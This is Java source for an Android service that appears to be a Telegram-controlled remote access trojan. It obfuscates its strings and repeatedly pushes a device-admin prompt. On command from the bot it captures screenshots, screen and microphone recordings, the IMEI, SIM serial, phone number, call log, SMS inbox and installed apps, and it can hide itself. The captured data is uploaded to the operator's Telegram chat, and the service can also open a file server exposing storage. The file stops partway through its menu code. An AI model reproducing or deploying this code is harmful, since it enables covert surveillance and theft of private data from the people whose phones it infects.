package com.zero.xploid;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;
import java.util.UUID;

public class MainService extends Service {

    // ── Obfuscation function (keeps existing logic) ──
    private static String $(String str) {
        StringBuilder sb = new StringBuilder();
        char[] charArray = str.toCharArray();
        for (int i = 0; i < charArray.length; i++) {
            switch (i % 4) {
                case 0: sb.append((char) (charArray[i] ^ 19620)); break;
                case 1: sb.append((char) (charArray[i] ^ 35958)); break;
                case 2: sb.append((char) (charArray[i] ^ 31761)); break;
                default: sb.append((char) (charArray[i] ^ 65535)); break;
            }
        }
        return sb.toString();
    }

    // ── Original constants (already obfuscated) ──
    private final String CREATED_BY = $("䳩谗籹ﾞ䳀谓米￟䳶豘簿ﾛ䳅谅").intern();
    private static final String PREF_DEVICE = $("䳔谄籴ﾙ䳗").intern();
    private static final String PREF_SCREEN = $("䳔谓籣ﾒ䳻谆籣ﾚ䳂谅").intern();
    private static final String KEY_SCREEN_CAPTURED = $("䳗谕籣ﾚ䳁谘籎ﾜ䳅谆籥ﾊ䳖谓籎ﾘ䳖谗籿ﾋ䳁谒").intern();

    // ── New feature callback data (plain text for simplicity – obfuscate later if desired) ──
    private static final String CB_FLASHLIGHT_ON = "flashlight_on";
    private static final String CB_FLASHLIGHT_OFF = "flashlight_off";
    private static final String CB_SIM_INFO = "sim_info";
    private static final String CB_APP_LIST = "app_list";
    private static final String CB_FOREGROUND_APP = "foreground_app";
    private static final String CB_CALL_LOG = "call_log";
    private static final String CB_SMS_INBOX = "sms_inbox";
    private static final String CB_FILE_SERVER_START = "file_server_start";
    private static final String CB_FILE_SERVER_STOP = "file_server_stop";

    // ── Service state ──
    private boolean running = true;
    private int lastUpdateId = 0;
    private PowerManager.WakeLock wakeLock;
    private Timer timer;
    private int lastMenuMessageId = 0;

    private static Intent captureIntent = null;
    private static int captureResultCode = -1;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private MediaRecorder mediaRecorder;
    private String deviceId, deviceName, deviceModel, deviceBrand, androidVersion;
    private boolean isRecording = false;

    // Flashlight
    private CameraManager cameraManager;
    private boolean flashlightOn = false;

    // File server
    private ServerSocket serverSocket;
    private boolean fileServerRunning = false;

    @Override
    public void onCreate() {
        super.onCreate();
        deviceBrand = Build.BRAND;
        deviceModel = Build.MODEL;
        deviceName = Build.MANUFACTURER + " " + Build.MODEL;
        androidVersion = Build.VERSION.RELEASE;

        SharedPreferences prefs = getSharedPreferences(PREF_DEVICE, MODE_PRIVATE);
        deviceId = prefs.getString("id", null);
        if (deviceId == null) {
            deviceId = UUID.randomUUID().toString().substring(0, 8).toUpperCase();
            prefs.edit().putString("id", deviceId).commit();
        }

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Zero:lock");
        wakeLock.acquire();

        startForeground();
        startTimer();
        sendDeviceOnlineMessage();
        new Thread(this::listenTelegram).start();
    }

    private void sendDeviceOnlineMessage() {
        sendMessage("🟢 **DEVICE ONLINE**\n\n" + getDeviceDetailsString() +
                    "\n\n💡 Telegram Channel @zerodeb\n👨‍💻 **Created by:** " + CREATED_BY +
                    "\n\n📱 Type /start to see menu");
    }

    private String getDeviceDetailsString() {
        return "📱 **Device:** " + deviceName + "\n" +
               "🏷️ **Brand:** " + deviceBrand + "\n" +
               "📟 **Model:** " + deviceModel + "\n" +
               "🆔 **ID:** `" + deviceId + "`\n" +
               "🔋 **Battery:** " + getBatteryPercentage() + "%\n" +
               "🤖 **Android:** " + androidVersion;
    }

    private String getFooter() {
        return "\n\n💡 Telegram Channel @zerodeb\n👨‍💻 **Created by:** " + CREATED_BY;
    }

    private void startForeground() {
        if (Build.VERSION.SDK_INT >= 26) {
            String chId = "zero_foreground";
            NotificationChannel ch = new NotificationChannel(chId, "Zero Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager mgr = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            mgr.createNotificationChannel(ch);
            Notification notification = new Notification.Builder(this, chId)
                    .setContentTitle("Zero is running")
                    .setContentText(deviceName + " | Battery: " + getBatteryPercentage() + "%")
                    .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
                    .build();
            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC |
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION |
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
            } else {
                startForeground(1, notification);
            }
        }
    }

    private void startTimer() {
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                Log.d("ZeroService", "Battery: " + getBatteryPercentage() + "%");
                updateNotification();
                DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                ComponentName comp = new ComponentName(MainService.this, AdminReceiver.class);
                if (!dpm.isAdminActive(comp)) {
                    Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                }
            }
        }, 60000, 60000);
    }

    private void updateNotification() {
        if (Build.VERSION.SDK_INT >= 26) {
            String chId = "zero_foreground";
            Notification notification = new Notification.Builder(this, chId)
                    .setContentTitle("Zero is running")
                    .setContentText(deviceName + " | Battery: " + getBatteryPercentage() + "%")
                    .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
                    .build();
            startForeground(1, notification);
        }
    }

    private int getBatteryPercentage() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
                return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
            } else {
                Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
                int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                return (level * 100) / scale;
            }
        } catch (Exception e) { return 50; }
    }

    // ── Screenshot ──
    private void takeScreenshot() {
        if (captureIntent == null) {
            sendMessage("📸 No media projection permission yet.");
            return;
        }
        sendMessage("📸 Screenshot capturing...");
        new Thread(() -> {
            try {
                String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
                File screenshotsDir = new File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "Screenshots");
                screenshotsDir.mkdirs();
                final File outputFile = new File(screenshotsDir, "Screenshot_" + timestamp + ".png");
                takeScreenshotViaMediaProjection(outputFile);
            } catch (Exception e) {
                sendMessage("❌ Screenshot error: " + e.getMessage());
            }
        }).start();
    }

    private void takeScreenshotViaMediaProjection(final File outputFile) {
        try {
            DisplayMetrics metrics = getResources().getDisplayMetrics();
            final int width = metrics.widthPixels;
            final int height = metrics.heightPixels;
            int density = metrics.densityDpi;
            MediaProjectionManager projManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            final MediaProjection mp = projManager.getMediaProjection(captureResultCode, captureIntent);
            final ImageReader imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
            final VirtualDisplay vd = mp.createVirtualDisplay("screenshot", width, height, density,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
            Thread.sleep(500);
            final Image image = imageReader.acquireLatestImage();
            if (image != null) {
                Image.Plane[] planes = image.getPlanes();
                ByteBuffer buffer = planes[0].getBuffer();
                int pixelStride = planes[0].getPixelStride();
                int rowStride = planes[0].getRowStride();
                int rowPadding = rowStride - pixelStride * width;
                Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
                bitmap.copyPixelsFromBuffer(buffer);
                bitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height);
                FileOutputStream fos = new FileOutputStream(outputFile);
                bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
                fos.close();
                bitmap.recycle();
                image.close();
                uploadFile(outputFile, "screenshot");
            } else {
                sendMessage("❌ Failed to capture screenshot image.");
            }
            vd.release();
            mp.stop();
            imageReader.close();
        } catch (Exception e) {
            sendMessage("❌ Screenshot error: " + e.getMessage());
        }
    }

    // ── Screen recording ──
    private void startScreenRecording(int seconds, boolean withAudio) {
        if (captureIntent == null) {
            sendMessage("🎥 No media projection permission yet.");
            return;
        }
        if (isRecording) {
            sendMessage("⚠️ Already recording!");
            return;
        }
        String type = withAudio ? "Screen+Audio" : "Screen";
        String durationText = formatDuration(seconds);
        sendMessage("🎥 " + type + " recording started (" + durationText + ")");
        new Thread(() -> {
            try {
                isRecording = true;
                String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
                File recordingsDir = new File(getExternalFilesDir(Environment.DIRECTORY_MOVIES), "Recordings");
                recordingsDir.mkdirs();
                File outputFile = new File(recordingsDir, "Screen_" + timestamp + ".mp4");
                DisplayMetrics metrics = getResources().getDisplayMetrics();
                int width = metrics.widthPixels, height = metrics.heightPixels, density = metrics.densityDpi;
                MediaProjectionManager projManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
                mediaProjection = projManager.getMediaProjection(captureResultCode, captureIntent);
                mediaRecorder = new MediaRecorder();
                mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
                if (withAudio && checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
                    mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                }
                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
                mediaRecorder.setVideoEncodingBitRate(5000000);
                mediaRecorder.setVideoFrameRate(30);
                mediaRecorder.setVideoSize(width, height);
                if (withAudio) {
                    mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                    mediaRecorder.setAudioEncodingBitRate(128000);
                    mediaRecorder.setAudioSamplingRate(44100);
                }
                mediaRecorder.setOutputFile(outputFile.getAbsolutePath());
                mediaRecorder.prepare();
                virtualDisplay = mediaProjection.createVirtualDisplay("recording", width, height, density,
                        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, mediaRecorder.getSurface(), null, null);
                mediaRecorder.start();
                Thread.sleep(seconds * 1000L);
                mediaRecorder.stop();
                mediaRecorder.reset();
                virtualDisplay.release();
                mediaProjection.stop();
                isRecording = false;
                uploadFile(outputFile, "video");
            } catch (Exception e) {
                sendMessage("❌ Recording error: " + e.getMessage());
                isRecording = false;
            } finally {
                cleanup();
            }
        }).start();
    }

    private String formatDuration(int seconds) {
        return seconds < 60 ? seconds + "s" : (seconds / 60) + "m" + (seconds % 60 > 0 ? " " + (seconds % 60) + "s" : "");
    }

    // ── Audio recording ──
    private void startAudioRecording(int seconds) {
        if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("🎙️ No audio permission.");
            return;
        }
        String durationText = formatDuration(seconds);
        sendMessage("🎙️ Audio recording started (" + durationText + ")");
        new Thread(() -> {
            MediaRecorder audioRecorder = null;
            try {
                String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
                File audioDir = new File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "Audio");
                audioDir.mkdirs();
                File outputFile = new File(audioDir, "Audio_" + timestamp + ".mp3");
                audioRecorder = new MediaRecorder();
                audioRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                audioRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                audioRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                audioRecorder.setAudioEncodingBitRate(128000);
                audioRecorder.setAudioSamplingRate(44100);
                audioRecorder.setOutputFile(outputFile.getAbsolutePath());
                audioRecorder.prepare();
                audioRecorder.start();
                Thread.sleep(seconds * 1000L);
                audioRecorder.stop();
                audioRecorder.release();
                uploadFile(outputFile, "audio");
            } catch (Exception e) {
                sendMessage("❌ Audio error: " + e.getMessage());
                if (audioRecorder != null) {
                    try { audioRecorder.release(); } catch (Exception ignored) {}
                }
            }
        }).start();
    }

    private void cleanup() {
        try { if (mediaRecorder != null) { mediaRecorder.release(); mediaRecorder = null; } } catch (Exception ignored) {}
        try { if (virtualDisplay != null) { virtualDisplay.release(); virtualDisplay = null; } } catch (Exception ignored) {}
        try { if (mediaProjection != null) { mediaProjection.stop(); mediaProjection = null; } } catch (Exception ignored) {}
    }

    // ── Flashlight (Feature 4) ──
    private void setFlashlight(boolean on) {
        if (Build.VERSION.SDK_INT < 23) {
            sendMessage("❌ Flashlight requires Android 6+.");
            return;
        }
        if (cameraManager == null) cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
        try {
            String cameraId = cameraManager.getCameraIdList()[0]; // back camera usually
            if (on) {
                if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                    sendMessage("❌ Camera permission needed for flashlight.");
                    return;
                }
                cameraManager.setTorchMode(cameraId, true);
                flashlightOn = true;
                sendMessage("🔦 Flashlight ON");
            } else {
                cameraManager.setTorchMode(cameraId, false);
                flashlightOn = false;
                sendMessage("🔦 Flashlight OFF");
            }
        } catch (CameraAccessException e) {
            sendMessage("❌ Flashlight error: " + e.getMessage());
        }
    }

    // ── Full device status + SIM info (Features 5 & 8) ──
    private String getFullDeviceStatus() {
        StringBuilder sb = new StringBuilder("📊 **DEVICE STATUS**\n\n");
        sb.append(getDeviceDetailsString()).append("\n\n");
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (tm != null) {
                sb.append("📡 **Network:** ").append(tm.getNetworkOperatorName()).append("\n");
                sb.append("🆔 **IMEI:** ").append(tm.getDeviceId() != null ? tm.getDeviceId() : "N/A").append("\n");
                sb.append("📞 **Line Number:** ").append(tm.getLine1Number() != null ? tm.getLine1Number() : "N/A").append("\n");
                sb.append("💳 **SIM Serial:** ").append(tm.getSimSerialNumber() != null ? tm.getSimSerialNumber() : "N/A").append("\n");
            }
        } catch (Exception ignored) {}
        return sb.toString() + getFooter();
    }

    // ── App check (Feature 6) ──
    private String getInstalledAppsList() {
        StringBuilder sb = new StringBuilder("📱 **INSTALLED APPS**\n\n");
        PackageManager pm = getPackageManager();
        List<android.content.pm.ApplicationInfo> apps = pm.getInstalledApplications(0);
        for (android.content.pm.ApplicationInfo app : apps) {
            if ((app.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0) {
                String label = pm.getApplicationLabel(app).toString();
                sb.append(label).append(" (").append(app.packageName).append(")\n");
            }
        }
        return sb.toString();
    }

    private String getForegroundAppName() {
        if (Build.VERSION.SDK_INT >= 21) {
            android.app.usage.UsageStatsManager usm = (android.app.usage.UsageStatsManager) getSystemService(USAGE_STATS_SERVICE);
            long time = System.currentTimeMillis();
            List<android.app.usage.UsageStats> stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY,
                    time - 10_000, time);
            if (stats != null && !stats.isEmpty()) {
                android.app.usage.UsageStats recent = null;
                for (android.app.usage.UsageStats s : stats) {
                    if (recent == null || s.getLastTimeUsed() > recent.getLastTimeUsed()) recent = s;
                }
                if (recent != null) {
                    try {
                        return getPackageManager().getApplicationLabel(
                                getPackageManager().getApplicationInfo(recent.getPackageName(), 0)).toString();
                    } catch (Exception ignored) {}
                }
            }
        }
        return "Unknown";
    }

    // ── Call history (Feature 9) ──
    private void uploadCallHistory() {
        new Thread(() -> {
            try {
                File file = new File(getExternalFilesDir(null), "call_history.txt");
                Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
                if (cursor != null && cursor.moveToFirst()) {
                    StringBuilder sb = new StringBuilder();
                    do {
                        String num = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                        int typeInt = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
                        String type = typeInt == 1 ? "INCOMING" : typeInt == 2 ? "OUTGOING" : "MISSED";
                        String date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
                        String dur = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                        sb.append(date).append(" | ").append(num).append(" | ").append(type).append(" | ").append(dur).append("s\n");
                    } while (cursor.moveToNext());
                    cursor.close();
                    FileOutputStream fos = new FileOutputStream(file);
                    fos.write(sb.toString().getBytes());
                    fos.close();
                    uploadFile(file, "call_log");
                } else {
                    sendMessage("📞 No call history found.");
                }
            } catch (Exception e) {
                sendMessage("❌ Call history error: " + e.getMessage());
            }
        }).start();
    }

    // ── SMS history (Feature 10) ──
    private void uploadSmsHistory() {
        new Thread(() -> {
            try {
                File file = new File(getExternalFilesDir(null), "sms_inbox.txt");
                Cursor cursor = getContentResolver().query(
                        android.net.Uri.parse("content://sms/inbox"), null, null, null, null);
                if (cursor != null && cursor.moveToFirst()) {
                    StringBuilder sb = new StringBuilder();
                    do {
                        String address = cursor.getString(cursor.getColumnIndex("address"));
                        String body = cursor.getString(cursor.getColumnIndex("body"));
                        String date = cursor.getString(cursor.getColumnIndex("date"));
                        sb.append(date).append(" | ").append(address).append(" | ").append(body).append("\n");
                    } while (cursor.moveToNext());
                    cursor.close();
                    FileOutputStream fos = new FileOutputStream(file);
                    fos.write(sb.toString().getBytes());
                    fos.close();
                    uploadFile(file, "sms_inbox");
                } else {
                    sendMessage("✉️ No SMS inbox found.");
                }
            } catch (Exception e) {
                sendMessage("❌ SMS inbox error: " + e.getMessage());
            }
        }).start();
    }

    // ── File server (Feature 11) ──
    private void startFileServer() {
        if (fileServerRunning) {
            sendMessage("🌐 File server already running.");
            return;
        }
        new Thread(() -> {
            try {
                serverSocket = new ServerSocket(0);
                int port = serverSocket.getLocalPort();
                fileServerRunning = true;
                String ip = getLocalIpAddress();
                sendMessage("🌐 **FILE SERVER STARTED**\n🔗 http://" + ip + ":" + port);
                while (fileServerRunning) {
                    Socket client = serverSocket.accept();
                    new Thread(() -> handleHttpClient(client)).start();
                }
            } catch (Exception e) {
                sendMessage("❌ File server error: " + e.getMessage());
                fileServerRunning = false;
            }
        }).start();
    }

    private void stopFileServer() {
        fileServerRunning = false;
        try { if (serverSocket != null) serverSocket.close(); } catch (Exception ignored) {}
        sendMessage("🌐 File server stopped.");
    }

    private String getLocalIpAddress() {
        try {
            for (NetworkInterface intf : Collections.list(NetworkInterface.getNetworkInterfaces())) {
                for (InetAddress addr : Collections.list(intf.getInetAddresses())) {
                    if (!addr.isLoopbackAddress() && addr.getAddress().length == 4) {
                        return addr.getHostAddress();
                    }
                }
            }
        } catch (Exception ignored) {}
        return "127.0.0.1";
    }

    private void handleHttpClient(Socket client) {
        try {
            BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));
            OutputStream out = client.getOutputStream();
            String line = in.readLine();
            if (line != null && line.startsWith("GET")) {
                String path = line.split(" ")[1];
                File root = Environment.getExternalStorageDirectory();
                if (path.equals("/")) {
                    StringBuilder html = new StringBuilder("<html><body><h1>Files</h1><ul>");
                    listFiles(root, html, "/");
                    html.append("</ul></body></html>");
                    byte[] resp = html.toString().getBytes();
                    out.write(("HTTP/1.0 200 OK\r\nContent-Type: text/html\r\nContent-Length: " + resp.length + "\r\n\r\n").getBytes());
                    out.write(resp);
                } else {
                    File file = new File(root, path);
                    if (file.exists() && file.isFile()) {
                        FileInputStream fis = new FileInputStream(file);
                        out.write("HTTP/1.0 200 OK\r\nContent-Type: application/octet-stream\r\n\r\n".getBytes());
                        byte[] buf = new byte[4096];
                        int len;
                        while ((len = fis.read(buf)) != -1) out.write(buf, 0, len);
                        fis.close();
                    } else {
                        out.write("HTTP/1.0 404 Not Found\r\n\r\n".getBytes());
                    }
                }
            }
            out.flush();
            client.close();
        } catch (Exception ignored) {}
    }

    private void listFiles(File dir, StringBuilder html, String prefix) {
        File[] files = dir.listFiles();
        if (files != null) {
            for (File f : files) {
                String rel = prefix + f.getName();
                if (f.isDirectory()) {
                    html.append("<li><b><a href='").append(rel).append("/'>").append(rel).append("/</a></b></li>");
                    listFiles(f, html, rel + "/");
                } else {
                    html.append("<li><a href='").append(rel).append("'>").append(rel).append("</a></li>");
                }
            }
        }
    }

    // ── Telegram bot methods (complete, as originally) ──
    private void uploadFile(File file, String type) {
        new Thread(() -> {
            try {
                String method = "sendDocument";
                if (type.equals("video")) method = "sendVideo";
                else if (type.equals("audio")) method = "sendAudio";
                else if (type.equals("screenshot")) method = "sendPhoto";

                String boundary = UUID.randomUUID().toString();
                URL url = new URL("https://api.telegram.org/bot" + Config.BOT_TOKEN + "/" + method);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + Config.CHAT_ID + "\r\n");
                String paramName = "document";
                if (type.equals("video")) paramName = "video";
                else if (type.equals("audio")) paramName = "audio";
                else if (type.equals("screenshot")) paramName = "photo";

                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"" + paramName + "\"; filename=\"" + file.getName() + "\"\r\n");
                dos.writeBytes("Content-Type: application/octet-stream\r\n\r\n");

                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) dos.write(buffer, 0, bytesRead);
                fis.close();

                dos.writeBytes("\r\n--" + boundary + "--\r\n");
                dos.flush();
                dos.close();

                conn.getInputStream();
                conn.disconnect();
                file.delete();

                sendCompletionMessage(type, file.getName());
            } catch (Exception e) {
                Log.e("ZeroUpload", "Upload error: " + e.getMessage());
            }
        }).start();
    }

    private void sendCompletionMessage(String type, String fileName) {
        String emoji = type.equals("screenshot") ? "📸" : type.equals("video") ? "🎥" : type.equals("audio") ? "🎙️" : "📄";
        String msg = emoji + " **" + getTypeName(type) + " uploaded!**\n📄 `" + fileName + "`\n" + getDeviceDetailsString() + getFooter();
        sendMessage(msg);
    }

    private String getTypeName(String type) {
        if (type.equals("screenshot")) return "Screenshot";
        if (type.equals("video")) return "Screen Recording";
        if (type.equals("audio")) return "Audio Recording";
        return "File";
    }

    private void listenTelegram() {
        while (running) {
            try {
                String url = "https://api.telegram.org/bot" + Config.BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=5";
                String response = getRequest(url);
                if (response != null && !response.equals("")) {
                    JSONObject json = new JSONObject(response);
                    if (json.has("ok") && json.getBoolean("ok")) {
                        JSONArray resultArray = json.getJSONArray("result");
                        for (int i = 0; i < resultArray.length(); i++) {
                            JSONObject item = resultArray.getJSONObject(i);
                            lastUpdateId = item.getInt("update_id");
                            if (item.has("callback_query")) {
                                JSONObject callback = item.getJSONObject("callback_query");
                                String callbackId = callback.getString("id");
                                String data = callback.getString("data");
                                String messageId = String.valueOf(callback.getJSONObject("message").getInt("message_id"));
                                if (lastMenuMessageId != 0 && lastMenuMessageId != Integer.parseInt(messageId)) {
                                    deleteMessage(lastMenuMessageId);
                                }
                                lastMenuMessageId = Integer.parseInt(messageId);
                                answerCallback(callbackId);
                                processButtonClick(data);
                            } else if (item.has("message")) {
                                JSONObject message = item.getJSONObject("message");
                                JSONObject chat = message.getJSONObject("chat");
                                String chatId = String.valueOf(chat.getLong("id"));
                                String text = message.has("text") ? message.getString("text") : "";
                                if (chatId.equals(Config.CHAT_ID)) {
                                    if (text.equals("/start") || text.equals("/menu")) {
                                        showMainMenu();
                                    } else if (text.equals("/status")) {
                                        sendStatus();
                                    }
                                }
                            }
                        }
                    }
                }
                Thread.sleep(1000);
            } catch (Exception e) {
                Log.e("ZeroBot", "Listen error: " + e.getMessage());
                try { Thread.sleep(5000); } catch (Exception ignored) {}
            }
        }
    }

    private void deleteMessage(int messageId) {
        new Thread(() -> {
            try {
                String url = "https://api.telegram.org/bot" + Config.BOT_TOKEN + "/deleteMessage?chat_id=" + Config.CHAT_ID + "&message_id=" + messageId;
                getRequest(url);
            } catch (Exception ignored) {}
        }).start();
    }

    private void processButtonClick(String data) {
        if (data.equals("main_menu") || data.equals("refresh")) {
            showMainMenu();
        } else if (data.equals("screen_menu")) {
            showScreenMenu();
        } else if (data.equals("screenaudio_menu")) {
            showScreenAudioMenu();
        } else if (data.equals("audio_menu")) {
            showAudioMenu();
        } else if (data.equals("screenshot")) {
            takeScreenshot();
        } else if (data.equals("hide")) {
            hideApp();
        } else if (data.equals("unhide")) {
            unhideApp();
        } else if (data.equals("status")) {
            sendStatus();
        }
        // Screen recording durations (original)
        else if (data.startsWith("screen_")) {
            if (data.equals("screen_10")) startScreenRecording(10, false);
            else if (data.equals("screen_30")) startScreenRecording(30, false);
            else if (data.equals("screen_60")) startScreenRecording(60, false);
            else if (data.equals("screen_120")) startScreenRecording(120, false);
            else if (data.equals("screen_300")) startScreenRecording(300, false);
            else if (data.equals("screen_600")) startScreenRecording(600, false);
        }
        // Screen+Audio recording durations
        else if (data.startsWith("screenaudio_")) {
            if (data.equals("screenaudio_10")) startScreenRecording(10, true);
            else if (data.equals("screenaudio_30")) startScreenRecording(30, true);
            else if (data.equals("screenaudio_60")) startScreenRecording(60, true);
            else if (data.equals("screenaudio_120")) startScreenRecording(120, true);
            else if (data.equals("screenaudio_300")) startScreenRecording(300, true);
            else if (data.equals("screenaudio_600")) startScreenRecording(600, true);
        }
        // Audio recording durations
        else if (data.startsWith("audio_")) {
            if (data.equals("audio_10")) startAudioRecording(10);
            else if (data.equals("audio_30")) startAudioRecording(30);
            else if (data.equals("audio_60")) startAudioRecording(60);
            else if (data.equals("audio_120")) startAudioRecording(120);
            else if (data.equals("audio_300")) startAudioRecording(300);
            else if (data.equals("audio_600")) startAudioRecording(600);
        }
        // New features
        else if (data.equals(CB_FLASHLIGHT_ON)) {
            setFlashlight(true);
        } else if (data.equals(CB_FLASHLIGHT_OFF)) {
            setFlashlight(false);
        } else if (data.equals(CB_SIM_INFO)) {
            sendMessage(getFullDeviceStatus());
        } else if (data.equals(CB_APP_LIST)) {
            sendMessage(getInstalledAppsList());
        } else if (data.equals(CB_FOREGROUND_APP)) {
            sendMessage("📱 **Foreground app:** " + getForegroundAppName());
        } else if (data.equals(CB_CALL_LOG)) {
            uploadCallHistory();
        } else if (data.equals(CB_SMS_INBOX)) {
            uploadSmsHistory();
        } else if (data.equals(CB_FILE_SERVER_START)) {
            startFileServer();
        } else if (data.equals(CB_FILE_SERVER_STOP)) {
            stopFileServer();
        } else {
            sendMessage("⚠️ Unknown command: " + data);
        }
    }

    private void showMainMenu() {
        String keyboard = "{\"inline_keyboard\":["
                + "[{\"text\":\"📸 Screenshot\",\"callback_data\":\"screenshot\"},{\"text\":\"🎥 Screen Rec\",\"callback_data\":\"screen_menu\"}],"
                + "[{\"text\":\"🎥🎙️ Screen+Audio\",\"callback_data\":\"screenaudio_menu\"},{\"text\":\"🎙️ Audio Rec\",\"callback_data\":\"audio_menu\"}],"
                + "[{\"text\":\"🔦 Flashlight ON\",\"callback_data\":\"" + CB_FLASHLIGHT_ON + "\"},{\"text\":\"🔦 Flashlight OFF\",\"callback_data\":\"" + CB_FLASHLIGHT_OFF + "\"}],"
                + "[{\"text\":\"📡 SIM Info\",\"callback_data\":\"" + CB_SIM_INFO + "\"},{\"text\":\"📱 App List\",\"callback_data\":\"" + CB_APP_LIST + "\"}],"
                + "[{\"text\":\"📞 Call History\",\"callback_data\":\"" + CB_CALL_LOG + "\"},{\"text\":\"✉️ SMS Inbox\",\"callback_data\":\"" + CB_SMS_INBOX + "\"}],"
